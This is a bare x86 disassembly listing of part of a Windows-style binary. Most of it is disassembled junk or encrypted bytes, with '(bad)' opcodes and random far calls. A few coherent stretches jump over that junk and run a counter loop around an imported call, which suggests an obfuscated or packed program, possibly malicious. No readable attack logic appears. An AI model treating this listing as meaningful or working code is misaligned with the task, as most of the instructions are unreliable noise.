  40514b:	or     al,0xa5
  40514d:	jnp    0x4051ba
  40514f:	cli    
  405150:	push   cs
  405151:	add    al,0x35
  405153:	xchg   BYTE PTR [edi-0x4],bh
  405156:	(bad)  
  405157:	push   edi
  405158:	enter  0xbb37,0x2f
  40515c:	push   ds
  40515d:	shl    dl,0x60
  405160:	dec    edx
  405161:	ror    ah,0xbc
  405164:	lods   al,BYTE PTR ds:[esi]
  405165:	(bad)  
  405166:	test   ah,ch
  405168:	je     0x4051e6
  40516a:	gs or  eax,0x218fae67
  405170:	mov    DWORD PTR [esi+0x3a],edi
  405173:	fs mov ecx,0x4b0e831c
  405179:	test   eax,0x46557893
  40517e:	mov    edi,0x9d191a66
  405183:	or     bl,BYTE PTR [ebx+ebp*1+0x63]
  405187:	dec    edx
  405188:	dec    eax
  405189:	leave  
  40518a:	lds    eax,FWORD PTR [esi]
  40518c:	inc    edx
  40518d:	xor    DWORD PTR [esi+0x1a],eax
  405190:	lds    edx,FWORD PTR [eax-0x29855226]
  405196:	xor    BYTE PTR [esi],al
  405198:	aad    0xb0
  40519a:	fist   DWORD PTR [ebx+0x354ff71e]
  4051a0:	imul   esp,DWORD PTR [ebx+0x4fbc1625],0x7e
  4051a7:	xor    dh,BYTE PTR [ebp-0x63]
  4051aa:	call   0xadb6:0xe09c9e29
  4051b1:	sbb    cl,BYTE PTR [edx]
  4051b3:	ror    BYTE PTR [esi+0xd772320],0x11
  4051ba:	fiadd  DWORD PTR [edx-0x1e641a2]
  4051c0:	xor    BYTE PTR ss:[ebx-0x1e],ch
  4051c4:	or     dh,dl
  4051c6:	inc    esp
  4051c7:	push   0xffffffac
  4051c9:	or     al,BYTE PTR [eax-0x33c3932e]
  4051cf:	and    BYTE PTR [esp+ebx*8],al
  4051d2:	mov    esi,0xea4c3425
  4051d7:	fld    DWORD PTR [ecx]
  4051d9:	(bad)  
  4051da:	sti    
  4051db:	jmp    0x4051ed
  4051dd:	(bad)  
  4051de:	jo     0x405213
  4051e0:	mov    ch,0x44
  4051e2:	sub    esp,DWORD PTR [esi]
  4051e4:	jbe    0x4051b1
  4051e6:	out    dx,eax
  4051e7:	sbb    ecx,DWORD PTR [eax]
  4051e9:	xor    eax,0x71e8ad43
  4051ee:	int3   
  4051ef:	adc    al,BYTE PTR [esi]
  4051f1:	add    al,al
  4051f3:	jb     0x40520e
  4051f5:	adc    DWORD PTR [esp+edx*8+0x10347cab],ebx
  4051fc:	dec    ecx
  4051fd:	mov    bl,0x77
  4051ff:	add    eax,0x741bae51
  405204:	lea    eax,[eax+edx*1+0x32729a]
  40520b:	mov    DWORD PTR [ebp+0x8],eax
  40520e:	inc    DWORD PTR [ebp+0xc]
  405211:	jmp    0x404c37
  405216:	mov    eax,DWORD PTR [ebp-0x10]
  405219:	xor    eax,ecx
  40521b:	mov    ecx,DWORD PTR [ebp+0x10]
  40521e:	add    eax,esi
  405220:	mov    DWORD PTR [ecx],eax
  405222:	pop    esi
  405223:	leave  
  405224:	ret    0xc
  405227:	push   ebp
  405228:	mov    ebp,esp
  40522a:	jmp    0x4055fe
  40522f:	or     DWORD PTR ds:0x369d361d,0xffffffa3
  405236:	mov    ebp,0x424146fc
  40523b:	jbe    0x4052bb
  40523d:	jp     0x40521b
  40523f:	shr    BYTE PTR [edx],1
  405241:	jl     0x4052bf
  405243:	mov    ch,0x79
  405245:	jl     0x4052c3
  405247:	idiv   DWORD PTR [esp+ecx*1]
  40524a:	(bad)  
  40524b:	and    esp,DWORD PTR [edx]
  40524d:	imul   edi,DWORD PTR [ecx+0x10],0x75
  405251:	iret   
  405252:	into   
  405253:	or     bh,BYTE PTR [eax-0x48]
  405256:	inc    eax
  405257:	loop   0x4052a6
  405259:	xchg   esp,eax
  40525a:	mov    edi,0xc754a98e
  40525f:	fmul   QWORD PTR [ebp-0x29a3205d]
  405265:	pushf  
  405266:	fidiv  WORD PTR [ebp-0x66]
  405269:	xlat   BYTE PTR ds:[ebx]
  40526a:	out    0x4e,eax
  40526c:	test   al,bl
  40526e:	and    ah,BYTE PTR ds:0x44e59d20
  405274:	pop    ebx
  405275:	call   0xa2c728cf
  40527a:	in     eax,dx
  40527b:	shr    DWORD PTR ds:0x52a963d5,0x7d
  405282:	and    dh,BYTE PTR [edi]
  405284:	xor    esp,DWORD PTR cs:[eax+0x2c]
  405288:	and    DWORD PTR [edx+0x61],ebp
  40528b:	xchg   edi,ebp
  40528d:	call   0xd79e:0xd0543fd6
  405294:	bnd jge 0x4052fb
  405297:	push   esp
  405298:	jb     0x405230
  40529a:	(bad)  
  40529b:	push   ebp
  40529c:	mov    eax,0x81e5c823
  4052a1:	pop    edi
  4052a2:	dec    ebx
  4052a3:	xor    BYTE PTR [esi],dl
  4052a5:	xlat   BYTE PTR ds:[ebx]
  4052a6:	in     al,0xdc
  4052a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052a9:	test   BYTE PTR ds:0x9041f485,ch
  4052af:	mov    esp,0x55cd9e11
  4052b4:	mov    ds:0x841d96c8,eax
  4052b9:	iret   
  4052ba:	shl    dh,0xc4
  4052bd:	xchg   esp,eax
  4052be:	add    cl,BYTE PTR [edx]
  4052c0:	gs enter 0xb36e,0xfc
  4052c5:	xchg   ebp,eax
  4052c6:	sahf   
  4052c7:	jne    0x405267
  4052c9:	mov    ebp,?
  4052cb:	jecxz  0x40532f
  4052cd:	or     esi,edi
  4052cf:	sbb    esi,ebx
  4052d1:	mov    al,ds:0xdb5b464c
  4052d6:	adc    eax,0x345de818
  4052db:	popf   
  4052dc:	cmp    DWORD PTR [esi],edx
  4052de:	xchg   esi,eax
  4052df:	adc    DWORD PTR [eax+edx*1+0x3503e6ad],0xffffffd2
  4052e7:	sti    
  4052e8:	ret    0x94f1
  4052eb:	mov    gs,WORD PTR [ecx+0x7b93ef42]
  4052f1:	lds    ecx,FWORD PTR [ecx+eiz*4+0x2b680846]
  4052f8:	mov    ecx,0x56d053c1
  4052fd:	xor    al,0xbc
  4052ff:	loope  0x40529e
  405301:	daa    
  405302:	sbb    bh,dh
  405304:	pop    eax
  405305:	dec    ebx
  405306:	xchg   esi,eax
  405307:	xor    eax,0x86d4a0a1
  40530c:	test   BYTE PTR [ebp+edx*4-0x6a],ch
  405310:	dec    esi
  405311:	push   ecx
  405312:	cmp    ebx,ecx
  405314:	retf   0x2d58
  405317:	pop    ecx
  405318:	push   ecx
  405319:	inc    eax
  40531a:	cmp    DWORD PTR [ebx-0x3a],edi
  40531d:	iret   
  40531e:	retf   0x3894
  405321:	push   eax
  405322:	dec    edx
  405323:	in     eax,dx
  405324:	xor    DWORD PTR [ebx-0x3b],eax
  405327:	fisubr WORD PTR [eax-0x5d]
  40532a:	mov    dh,0x3
  40532c:	adc    DWORD PTR [edx+0x3dda793a],ecx
  405332:	lock inc esp
  405334:	sahf   
  405335:	mov    al,ds:0xcfaaf0d6
  40533a:	mov    ah,0xd
  40533c:	mov    BYTE PTR [esi-0x7a509418],dl
  405342:	ins    BYTE PTR es:[edi],dx
  405343:	sbb    BYTE PTR [eax-0x19a25435],dh
  405349:	aaa    
  40534a:	jg     0x405346
  40534c:	jg     0x405375
  40534e:	push   0x9077c2d2
  405353:	in     eax,dx
  405354:	pop    ebp
  405355:	mov    BYTE PTR [esi],ah
  405357:	adc    edi,esp
  405359:	mov    al,0x9c
  40535b:	inc    ebx
  40535c:	dec    ecx
  40535d:	outs   dx,BYTE PTR ds:[esi]
  40535e:	not    ch
  405360:	push   ebp
  405361:	sub    al,0xbc
  405363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405364:	pushf  
  405365:	pop    ebx
  405366:	adc    esp,DWORD PTR [edi+0x1f]
  405369:	(bad)  
  40536b:	cmp    al,0xf9
  40536d:	bound  edi,QWORD PTR [eax-0x72]
  405370:	add    al,0x88
  405372:	mov    cl,0xbe
  405374:	mov    ebx,0x6a00610d
  405379:	fs jbe 0x405371
  40537c:	pusha  
  40537d:	xchg   ecx,eax
  40537e:	popf   
  40537f:	or     dl,BYTE PTR ds:0x651db234
  405385:	mov    ch,0x4e
  405387:	sahf   
  405388:	int3   
  405389:	ja     0x405337
  40538b:	or     eax,0xccf97bf4
  405390:	sub    BYTE PTR [ecx-0x10],dl
  405393:	icebp  
  405394:	mov    esi,0xe1a4ece1
  405399:	push   ss
  40539a:	push   0xfffffffa
  40539c:	mov    edx,0xa1ecb255
  4053a1:	xchg   BYTE PTR [eax],ch
  4053a3:	cmp    DWORD PTR [ebx-0x5634ed17],ebp
  4053a9:	loopne 0x405373
  4053ab:	cli    
  4053ac:	gs xchg edx,eax
  4053ae:	xlat   BYTE PTR ds:[ebx]
  4053af:	test   eax,0x33193e60
  4053b4:	ror    BYTE PTR [edx],0xa0
  4053b7:	repz dec edi
  4053b9:	xor    al,0xbb
  4053bb:	int    0x4d
  4053bd:	add    ebx,eax
  4053bf:	jno    0x4053a2
  4053c1:	push   ebp
  4053c2:	pushf  
  4053c3:	pop    edi
  4053c4:	mov    ah,0xac
  4053c6:	out    dx,al
  4053c7:	add    bh,bl
  4053c9:	shl    DWORD PTR [esp+eiz*4-0x76],0x88
  4053ce:	xor    BYTE PTR [ebx-0x51],al
  4053d1:	push   edx
  4053d2:	mov    ebx,0x2bbf5a00
  4053d7:	add    BYTE PTR [edi+0x3d],al
  4053da:	pushf  
  4053db:	lock pop edi
  4053dd:	cld    
  4053de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053df:	out    0xc6,eax
  4053e1:	mov    dl,dl
  4053e3:	popa   
  4053e4:	and    bl,dl
  4053e6:	xor    BYTE PTR ds:0x1d150884,dh
  4053ec:	mov    ebp,DWORD PTR [ecx]
  4053ee:	and    cl,BYTE PTR [esi-0x69]
  4053f1:	cld    
  4053f2:	push   0xce3b3ac0
  4053f7:	sbb    DWORD PTR [edx+0x63c6cdf4],0xffffff88
  4053fe:	in     al,0xe8
  405400:	loope  0x405430
  405402:	fist   WORD PTR [edi]
  405404:	sub    esi,DWORD PTR [ecx]
  405406:	pop    ebx
  405407:	mov    WORD PTR [ecx+0x238c8ebe],gs
  40540d:	mov    ah,0xec
  40540f:	in     eax,0x5e
  405411:	inc    ebp
  405412:	inc    edi
  405413:	rcr    DWORD PTR [edi+0x5928c097],0x4a
  40541a:	jp     0x4053f9
  40541c:	mov    ?,WORD PTR [ebx]
  40541e:	push   edi
  40541f:	push   esp
  405420:	lea    edx,[edi+0x6]
  405423:	or     dh,BYTE PTR [ebx+0x5e]
  405426:	sub    DWORD PTR [ebx-0x7db13780],esp
  40542c:	out    dx,al
  40542d:	push   ebx
  40542e:	(bad)  
  40542f:	ins    BYTE PTR es:[edi],dx
  405430:	pop    es
  405431:	adc    BYTE PTR [esi-0x3b18eb24],al
  405437:	fbld   TBYTE PTR [esi-0x5e7612a9]
  40543d:	adc    eax,0x3e392b98
  405442:	xchg   edi,eax
  405443:	xlat   BYTE PTR ds:[ebx]
  405444:	jmp    0xba3:0x2218ce1d
  40544b:	xchg   ebx,eax
  40544c:	cwde   
  40544d:	push   edx
  40544e:	sbb    eax,0xad95ac1a
  405453:	adc    DWORD PTR [esi+0x39d4d1b0],eax
  405459:	adc    al,0x1
  40545b:	shl    DWORD PTR [eax+0x56],cl
  40545e:	sbb    eax,0x4baaf29b
  405463:	and    eax,0x24eecf5c
  405468:	xchg   BYTE PTR [ebp+0x8],bl
  40546b:	adc    DWORD PTR [esi+0x41cb1643],eax
  405471:	push   esp
  405472:	mov    dh,0x2a
  405474:	loope  0x40545e
  405476:	arpl   WORD PTR [edi+ecx*8+0x6f939116],ax
  40547d:	lods   eax,DWORD PTR ss:[esi]
  40547f:	xor    al,0xb9
  405481:	xor    al,0x69
  405483:	adc    eax,0xadfec1d1
  405488:	xchg   esi,eax
  405489:	scas   al,BYTE PTR es:[edi]
  40548a:	mov    esp,0x123358e5
  40548f:	inc    esi
  405490:	out    dx,al
  405491:	retf   
  405492:	adc    ebp,DWORD PTR [edi]
  405494:	sub    BYTE PTR [esi-0x72522c48],0xd1
  40549b:	sub    ebp,DWORD PTR [ebx]
  40549d:	les    edi,FWORD PTR [ebx-0x21]
  4054a0:	pop    esi
  4054a1:	addr16 inc esp
  4054a3:	out    0x34,al
  4054a5:	ss call 0x7e12:0x92084e87
  4054ad:	ficomp DWORD PTR [esi]
  4054af:	jns    0x40545a
  4054b1:	cwde   
  4054b2:	jp     0x4054f9
  4054b4:	icebp  
  4054b5:	jge    0x4054d3
  4054b7:	shl    DWORD PTR [ebx],0xf4
  4054ba:	mov    cl,0xae
  4054bc:	in     eax,0x17
  4054be:	jle    0x405534
  4054c0:	jnp    0x40553c
  4054c2:	cmp    ah,dh
  4054c4:	mov    BYTE PTR [ebx+ebp*8+0x7e],0xe2
  4054c9:	or     DWORD PTR [edi+0x1ef53cec],0xffffff8d
  4054d0:	xchg   ebp,eax
  4054d1:	sbb    al,0x9c
  4054d3:	mov    bh,0x72
  4054d5:	xor    BYTE PTR [ebx+0x2990e1e7],bl
  4054db:	pop    ebx
  4054dc:	inc    esi
  4054dd:	cmp    esi,DWORD PTR [ecx]
  4054df:	add    ah,BYTE PTR [edx-0x47]
  4054e2:	sub    edx,ebx
  4054e4:	or     al,0x91
  4054e6:	cs pushf 
  4054e8:	leave  
  4054e9:	sub    ebx,ecx
  4054eb:	dec    ebx
  4054ec:	push   cs
  4054ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054ee:	xor    DWORD PTR [eax+edx*2-0x63e84baf],edx
  4054f5:	dec    esi
  4054f6:	repnz mov al,ds:0x299e124b
  4054fc:	xor    BYTE PTR [esi-0x7a],bl
  4054ff:	or     BYTE PTR [eax+0x5c80679],cl
  405505:	mov    edx,0xa887d9c4
  40550a:	fidivr DWORD PTR [edx]
  40550c:	pop    ds
  40550d:	mov    ds:0xe495b4d0,eax
  405512:	test   DWORD PTR [edi+0x11],ebp
  405515:	sti    
  405516:	and    al,0x32
  405518:	inc    eax
  405519:	ins    BYTE PTR es:[edi],dx
  40551a:	ss inc edx
  40551c:	push   ss
  40551d:	xor    DWORD PTR [ecx+ebx*2],esi
  405520:	retf   
  405521:	aaa    
  405522:	fisttp QWORD PTR [esi+0x256f764b]
  405528:	jge    0x40558d
  40552a:	xchg   ebp,eax
  40552b:	cld    
  40552c:	pop    esi
  40552d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40552e:	daa    
  40552f:	ret    0x6b8d
  405532:	add    dh,BYTE PTR [eax+0x2a]
  405535:	add    al,0xaf
  405537:	dec    eax
  405538:	jae    0x405511
  40553a:	stc    
  40553b:	jg     0x40554d
  40553d:	pushf  
  40553e:	sub    BYTE PTR [ecx],ah
  405540:	cmp    al,0xf5
  405542:	jbe    0x40553e
  405544:	mov    ebp,0x6f279e72
  405549:	dec    ebp
  40554a:	mov    bh,0x6a
  40554c:	in     eax,dx
  40554d:	fs jno 0x40555e
  405550:	(bad)  
  405551:	in     al,dx
  405552:	or     DWORD PTR [edx+0x37],edi
  405555:	fxch   st(0)
  405557:	mov    dh,0x30
  405559:	jg     0x405511
  40555b:	int    0xab
  40555d:	xchg   esi,eax
  40555e:	lea    esp,[eax+0x1e5896ff]
  405564:	mov    eax,0x374618e3
  405569:	cld    
  40556a:	cmp    al,0xe0
  40556c:	xchg   edi,eax
  40556e:	iret   
  40556f:	sbb    BYTE PTR [ebx+ecx*4],cl
  405572:	or     al,0xe7
  405574:	and    al,0x17
  405576:	xor    bl,al
  405578:	mov    ebp,0xa38822f5
  40557d:	loope  0x4055ef
  40557f:	mov    al,ds:0x9f89055a
  405584:	and    bl,BYTE PTR [esi+0x3e]
  405587:	jo     0x40556e
  405589:	bound  eax,QWORD PTR [eax+0x6eb67ec1]
  40558f:	ins    DWORD PTR es:[edi],dx
  405590:	scas   eax,DWORD PTR es:[edi]
  405591:	shl    DWORD PTR [esi+0x36],1
  405594:	jp     0x405580
  405596:	hlt    
  405597:	rdtsc  
  405599:	inc    edi
  40559a:	or     BYTE PTR [edi+edi*4],al
  40559d:	dec    edx
  40559e:	push   ebp
  40559f:	xchg   ebp,eax
  4055a0:	push   ecx
  4055a1:	das    
  4055a2:	(bad)  
  4055a3:	fcomp  st(2)
  4055a5:	inc    ecx
  4055a6:	je     0x4055b8
  4055a8:	ss into 
  4055aa:	add    BYTE PTR [ebx+edx*4+0x46],bh
  4055ae:	or     DWORD PTR [edx],ecx
  4055b0:	pushf  
  4055b1:	mov    ebx,0x4b374d4d
  4055b6:	push   ss
  4055b7:	pop    ss
  4055b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055b9:	das    
  4055ba:	adc    al,0xf1
  4055bc:	loope  0x4055f4
  4055be:	repnz cmp eax,0xfc4738cf
  4055c4:	jle    0x4055f1
  4055c6:	push   edx
  4055c7:	repnz xchg ebp,eax
  4055c9:	ret    
  4055ca:	dec    eax
  4055cb:	dec    edi
  4055cc:	lods   al,BYTE PTR ds:[esi]
  4055cd:	ds jb  0x405595
  4055d0:	sbb    al,0x85
  4055d2:	cli    
  4055d3:	push   esi
  4055d4:	in     eax,0x88
  4055d6:	xlat   BYTE PTR ds:[ebx]
  4055d7:	rcl    eax,1
  4055d9:	call   0xf6d:0x6d666b3f
  4055e0:	or     al,ah
  4055e2:	fwait
  4055e3:	or     esi,esi
  4055e5:	pop    ss
  4055e6:	or     DWORD PTR [edx-0x186d2201],ecx
  4055ec:	leave  
  4055ed:	pop    ds
  4055ee:	mov    ?,WORD PTR [ebp+0x5f7877df]
  4055f4:	pop    ss
  4055f5:	sub    DWORD PTR [ebp+ecx*1+0x59],ebp
  4055f9:	hlt    
  4055fa:	fidivr WORD PTR [eax-0x78]
  4055fd:	xor    DWORD PTR [ecx+0x51],edx
  405600:	and    DWORD PTR ds:0x433563,0x0
  40560a:	mov    eax,ds:0x433563
  40560f:	inc    eax
  405610:	mov    ds:0x433563,eax
  405615:	cmp    DWORD PTR ds:0x433563,0x4
  40561c:	jne    0x405630
  405622:	push   0x6994
  405627:	push   DWORD PTR [ebp-0xc]
  40562a:	call   DWORD PTR ds:0x412254
  405630:	cmp    DWORD PTR ds:0x433563,0x3
  405637:	jne    0x405648
  40563d:	mov    eax,ds:0x433563
  405642:	inc    eax
  405643:	mov    ds:0x433563,eax
  405648:	cmp    DWORD PTR ds:0x433563,0x12
  40564f:	jb     0x40560a
  405655:	sbb    edx,ecx
  405657:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40565e:	jmp    0x405a32
  405663:	xchg   ecx,eax
  405664:	dec    ebx
  405665:	xor    eax,0xbd71fd91
  40566a:	dec    ebx
  40566b:	rcl    DWORD PTR [esi+0x1d],1
  40566e:	push   esi
  40566f:	and    BYTE PTR [edi+0x53],dh
  405672:	mov    WORD PTR [ecx],cs
  405674:	ss jl  0x4056f3
  405677:	mov    ch,0x79
  405679:	jl     0x4056f7
  40567b:	inc    ebx
  40567c:	(bad)  
  40567d:	fadd   DWORD PTR [ebx-0x56]
  405680:	inc    edx
  405681:	and    al,0x64
  405683:	add    esp,DWORD PTR [edx-0x53b5d1f4]
  405689:	aas    
  40568a:	push   edi
  40568b:	outs   dx,BYTE PTR ds:[esi]
  40568c:	push   eax
  40568d:	imul   ebx,ebp,0x6c109457
  405693:	mov    ch,0x5d
  405695:	nop
  405696:	out    0x67,al
  405698:	sub    eax,0xa7d5e721
  40569d:	cmp    edi,edx
  40569f:	(bad)  
  4056a0:	retf   0x4a86
  4056a3:	outs   dx,DWORD PTR ds:[esi]
  4056a4:	mov    esp,0xf32f586a
  4056a9:	and    al,0xd2
  4056ab:	data16 or dl,BYTE PTR gs:[ebx+0xb]
  4056b0:	xchg   ecx,ecx
  4056b2:	mov    ch,0xa5
  4056b4:	mov    gs,ebp
  4056b6:	inc    ecx
  4056b7:	mov    esp,0x34e7a5be
  4056bc:	xchg   DWORD PTR [edi+0x4d7c5d26],ecx
  4056c2:	icebp  
  4056c3:	fst    st(5)
  4056c5:	repz rcr ebp,0x53
  4056c9:	hlt    
  4056ca:	sbb    al,ch
  4056cc:	sbb    BYTE PTR [esi],bh
  4056ce:	neg    DWORD PTR [edi-0x2c]
  4056d1:	scas   al,BYTE PTR es:[edi]
  4056d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056d3:	ins    BYTE PTR es:[edi],dx
  4056d4:	fcmovnu st,st(2)
  4056d6:	je     0x40565b
  4056d8:	add    BYTE PTR [eax-0xb],0xc5
  4056dc:	(bad)  
  4056dd:	jmp    0x9034d20a
  4056e2:	nop
  4056e3:	(bad)  
  4056e4:	mov    edi,0xddc97ce1
  4056e9:	pop    ecx
  4056ea:	popa   
  4056eb:	wbinvd 
  4056ed:	fucom  st(4)
  4056ef:	inc    edi
  4056f0:	jecxz  0x4056cf
  4056f2:	out    dx,al
  4056f3:	das    
  4056f4:	ss int 0xd8
  4056f7:	sub    dl,bh
  4056f9:	daa    
  4056fa:	mov    cs,edi
  4056fc:	(bad)  
  4056fd:	aas    
  4056fe:	jecxz  0x405699
  405700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405701:	call   0x14c1:0x58ae8c13
  405708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405709:	add    esp,edx
  40570b:	mul    BYTE PTR [eax+edx*2+0x2ff92dd3]
  405712:	cmp    ch,BYTE PTR [eax-0x6f]
  405715:	xchg   ebx,eax
  405716:	std    
  405717:	pop    ebx
  405718:	xchg   esi,eax
  405719:	fistp  DWORD PTR [ebp+0x17]
  40571c:	into   
  40571d:	test   eax,0xa77176f7
  405722:	push   0xffffffc4
  405724:	mov    bl,0x72
  405726:	paddsw mm1,QWORD PTR [edx]
  405729:	(bad)  
  40572a:	and    eax,0xde313890
  40572f:	xchg   ebx,eax
  405730:	out    0xa8,al
  405732:	nop
  405733:	lods   al,BYTE PTR ds:[esi]
  405734:	xor    eax,0x21b88f33
  405739:	mov    al,0xf6
  40573b:	call   0x33986a53
  405740:	std    
  405741:	je     0x405721
  405743:	mov    esp,0x585e7423
  405748:	sti    
  405749:	fldcw  WORD PTR [eax+0x6e]
  40574c:	pop    edi
  40574d:	into   
  40574e:	jnp    0x40573e
  405750:	jb     0x4056f0
  405752:	mov    eax,0x756a1c5
  405757:	pop    ecx
  405758:	in     eax,dx
  405759:	cmp    eax,0xfae029cd
  40575e:	cld    
  40575f:	push   cs
  405760:	or     eax,0xddb9aa8b
  405765:	repz xchg esi,eax
  405767:	sahf   
  405768:	push   ebp
  405769:	mov    ch,0x1c
  40576b:	scas   eax,DWORD PTR es:[edi]
  40576c:	out    0xc0,al
  40576e:	ds jns 0x40570a
  405771:	mul    BYTE PTR [ecx+0x7d]
  405774:	fst    DWORD PTR [edx-0x26]
  405777:	pop    ss
  405778:	imul   DWORD PTR fs:[esi]
  40577b:	lahf   
  40577c:	test   DWORD PTR [ecx+0xe],ebx
  40577f:	jnp    0x4057ff
  405781:	or     eax,0x66f8d4d8
  405786:	(bad)  
  405788:	xor    al,BYTE PTR [ebp+0x5e3c1acf]
  40578e:	xor    DWORD PTR [esi],0xffffffc6
  405791:	xchg   ebx,eax
  405792:	jb     0x405790
  405794:	jmp    0x705f883d
  405799:	retf   
  40579a:	int    0xa
  40579c:	ins    BYTE PTR es:[edi],dx
  40579d:	repz cmp BYTE PTR [ecx+0x29],0x4c
  4057a2:	ret    
  4057a3:	bound  ebx,QWORD PTR [ebx+0x326c4e3a]
  4057a9:	fistp  DWORD PTR [esi-0x6a15b332]
  4057af:	ret    
  4057b0:	icebp  
  4057b1:	or     bh,BYTE PTR [ebp-0x4]
  4057b4:	adc    bl,BYTE PTR [eax-0x49651464]
  4057ba:	aaa    
  4057bb:	add    DWORD PTR [edx],edi
  4057bd:	push   ebx
  4057be:	mov    bh,0xfd
  4057c0:	push   ebx
  4057c1:	push   ss
  4057c2:	mov    al,0x73
  4057c4:	jmp    0x948e:0xd16a9ddc
  4057cb:	jmp    0x4057c5
  4057cd:	addr16 mov esp,0x440e6825
  4057d3:	popaw  
  4057d5:	dec    eax
  4057d6:	cvtpi2ps xmm3,mm6
  4057d9:	loop   0x405761
  4057db:	shl    DWORD PTR [eax-0x4b],0x67
  4057df:	dec    ebx
  4057e0:	mov    dl,dl
  4057e2:	ret    0x2907
  4057e5:	adc    edi,esp
  4057e7:	test   BYTE PTR [edx+0x5f],dh
  4057ea:	je     0x4057f4
  4057ec:	push   ecx
  4057ed:	retf   0x7cad
  4057f0:	sub    al,BYTE PTR [ecx+0x1f628d2f]
  4057f6:	mov    WORD PTR gs:[esi+0x26],ds
  4057fa:	fcom   DWORD PTR [ebx+ebx*4-0x4f]
  4057fe:	jb     0x4057ad
  405800:	popf   
  405801:	jo     0x405863
  405803:	or     esi,DWORD PTR ds:0xd29d6722
  405809:	and    al,0x2c
  40580b:	xor    al,0x8d
  40580d:	add    eax,0xeedba01
  405812:	scas   eax,DWORD PTR es:[edi]
  405813:	lock icebp 
  405815:	shl    DWORD PTR ds:0x716e2b8b,0xb7
  40581c:	pop    ebp
  40581d:	call   0xb46a:0x1e978825
  405824:	xchg   ebp,eax
  405825:	sbb    al,0xaa
  405827:	imul   ecx,edx,0x3769e38
  40582d:	je     0x405829
  40582f:	enter  0x23f1,0xa1
  405833:	fstp   TBYTE PTR [ebx]
  405835:	push   0xe7e1eaa1
  40583a:	(bad)  [ecx]
  40583c:	jl     0x40582b
  40583e:	jno    0x405878
  405840:	adc    BYTE PTR [eax-0x6e],0xac
  405844:	xor    bh,BYTE PTR [edx]
  405846:	adc    esp,DWORD PTR [edi-0x6d1d07fd]
  40584c:	das    
  40584d:	add    al,0xe7
  40584f:	mov    ah,0xd2
  405851:	call   0x7fa519e4
  405856:	mov    bh,0x4d
  405858:	xchg   edi,eax
  405859:	outs   dx,DWORD PTR ds:[esi]
  40585a:	call   0x2ff0:0xe5ebdf5b
  405861:	rcr    cl,cl
  405863:	lock retf 0x8b7
  405867:	repnz call 0x93f9:0xe7284b4f
  40586f:	sbb    edi,edx
  405871:	xlat   BYTE PTR ds:[ebx]
  405872:	jl     0x405859
  405874:	fbld   TBYTE PTR [edi-0xa]
  405877:	cdq    
  405878:	add    eax,0x8b0a869c
  40587d:	sub    BYTE PTR [edx],ah
  40587f:	repnz dec ebp
  405881:	push   ss
  405882:	int3   
  405883:	pop    ebp
  405884:	add    DWORD PTR [ebp+0x56],edx
  405887:	mov    dl,0x6f
  405889:	cmc    
  40588a:	retf   
  40588b:	retf   0x4d0c
  40588e:	adc    eax,0x8e126aa7
  405893:	mov    esp,0x81d4c0e1
  405898:	pusha  
  405899:	neg    DWORD PTR [ecx+0x12]
  40589c:	jae    0x4058b1
  40589e:	jb     0x405833
  4058a0:	fcom   st(4)
  4058a2:	daa    
  4058a3:	push   ebp
  4058a4:	loopne 0x4058f2
  4058a6:	pop    ebp
  4058a7:	ins    BYTE PTR es:[edi],dx
  4058a8:	not    DWORD PTR [ebp+0xefcc67]
  4058ae:	dec    edi
  4058af:	and    ah,BYTE PTR [edi+0x1b278e6b]
  4058b5:	or     esp,esp
  4058b7:	int3   
  4058b8:	xor    ch,cl
  4058ba:	inc    ecx
  4058bb:	fbstp  TBYTE PTR [ebx+0x501715cf]
  4058c1:	leave  
  4058c2:	jae    0x405858
  4058c4:	jne    0x40591f
  4058c6:	addr16 xor eax,0x4d054e4e
  4058cc:	outs   dx,BYTE PTR ds:[esi]
  4058cd:	stos   DWORD PTR es:[edi],eax
  4058ce:	shr    BYTE PTR [edx+0x41d9b35d],0xc5
  4058d5:	or     DWORD PTR [ebx+0x31],edi
  4058d8:	aas    
  4058d9:	arpl   WORD PTR [ebx+0x41],dx
  4058dc:	shl    DWORD PTR [si+0x72df],1
  4058e1:	sub    al,0x92
  4058e3:	mov    dh,ah
  4058e5:	inc    ecx
  4058e6:	fidiv  DWORD PTR [edi+0x54f9a983]
  4058ec:	in     al,0x49
  4058ee:	psubusb mm0,QWORD PTR [edi+0x4b769b8b]
  4058f5:	add    eax,0xaba69a4d
  4058fa:	cmp    bl,dh
  4058fc:	ret    
  4058fd:	pop    ebp
  4058fe:	cs jns 0x405906
  405901:	lods   al,BYTE PTR ds:[esi]
  405902:	pop    edx
  405903:	enter  0xe012,0x2e
  405907:	sbb    bh,BYTE PTR [ebp-0x1974cab7]
  40590d:	push   ds
  40590e:	adc    BYTE PTR [ecx-0x43ea1d92],al
  405914:	sub    eax,0xf41a9cb1
  405919:	out    dx,al
  40591a:	push   0x18959597
  40591f:	js     0x405951
  405921:	push   0xfafc1027
  405926:	aad    0x21
  405928:	pop    esp
  405929:	adc    al,0x76
  40592b:	(bad)  
  40592c:	out    dx,eax
  40592d:	mov    ds:0x89c7d4a3,eax
  405932:	stos   BYTE PTR es:[edi],al
  405933:	adc    eax,0x7784b388
  405938:	mov    gs,edi
  40593a:	mov    WORD PTR [eax+0xfbcbf],fs
  405940:	dec    ebx
  405941:	jns    0x4058e9
  405943:	sbb    DWORD PTR [ebx],edi
  405945:	sub    BYTE PTR [ecx+0x3f56b23b],ch
  40594b:	mov    BYTE PTR [ecx+0x79],al
  40594e:	add    BYTE PTR [ebx-0x6c555cf1],al
  405954:	cmp    BYTE PTR [edi],0x6d
  405957:	call   0xa9a4a977
  40595c:	pop    esi
  40595d:	cdq    
  40595e:	dec    esp
  40595f:	jne    0x405934
  405961:	push   ecx
  405962:	and    BYTE PTR cs:[edi-0x19],0xe4
  405967:	mov    ds:0x1c6b25d0,al
  40596c:	lea    ecx,[edx-0x7c]
  40596f:	cmp    al,BYTE PTR [ebp+0x67]
  405972:	rcr    BYTE PTR [esi-0x3559f151],cl
  405978:	adc    al,0x6c
